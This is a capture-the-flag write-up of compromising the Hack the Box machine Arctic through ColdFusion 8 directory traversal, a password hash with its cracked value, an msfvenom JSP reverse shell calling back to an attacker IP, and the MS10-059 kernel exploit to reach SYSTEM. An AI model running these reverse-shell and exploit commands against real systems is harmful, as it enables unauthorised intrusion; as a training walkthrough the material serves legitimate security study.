# Overview
Arctic is a vulnerable machine from [Hack the Box](https://www.hackthebox.com) that requires some basic web enumeration with using exploits to grab credentials and get a shell. The foothold is accomplished after using a public exploit that will allow for arbitrary file upload. The privilege escalation/abuse is using a file on the machine is done through a kernel level exploit that allows us to get a shell back through a public exploit as the `nt authority\system.`

## Nmap Scan
sudo nmap -sS -Pn `10.10.10.11` -vvv
* 135/tcp   open  msrpc   syn-ack ttl 127 
* 8500/tcp  open  fmtp    syn-ack ttl 127
* 49154/tcp open  unknown syn-ack ttl 127

## Basic Enumeration
Going out to the web page on port `8500`, we see two file directories, `CFIDE` and `cfdocs`. Looking through these, we eventually find `administrator`, asking for admin credentials. The web server appears to be an Adobe ColdFusion 8 developer server. 

* Using an exploit to abuse directory traversal, we are able to grab a hash for a password: `2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03`
* https://www.exploit-db.com/exploits/14641

We get this password `happyday`, and we can sign into the administrator login portal. 

## Foothold
There is a lot here, so we can either find a path here, or go back and look around more for other exploits. 

* Looking around further, we see these kinds of server's have arbitrary file upload available to abuse.

In order to use this, we will either need to get a reverse `.jsp` shell, or we can generate one with msfvenom. 

> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.5 LPORT=8081 -f raw > shell.jsp

* After running this, we can get a connection back to our attacker machine with netcat waiting. We are now on the box as user `tolis`. We have `user.txt`.

## Local Enumeration
We can run systeminfo, and run local exploit suggester to find possible paths to Privilege Escalation. Trying to run `winpeas` doesn't seem to work, and trying to run powershell on top of the shell seems to break the current foothold. 

* In order to find a way to run `winpeas` on the machine, we ended up pulling down a powershell reverse tcp script to get a `powershell` shell. From here, we then brough over a `meterpreter shell`, and got a connection back. We did this to have a more stable shell. 
* Using msfvenom to create a regular `windows/shell_reverse_tcp` didn't work for us to execute on the host, which is why we opted for the meterpreter shell. 

## Privilege Escalation
When doing exploit suggester, we get a lot of possible options, and the guided mode from `HTB` suggests to try to exploit the vulnerability related to `MS10-059`.

* https://learn.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-059
* POC: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059

We pull the file `MS10-059.exe` onto the host, and execute this as the following to get a shell back as the administrator: `MS10-059.exe <hackerip> <listeningport>`

* Now we have access as `nt authority\system`, and can read `root.txt`:
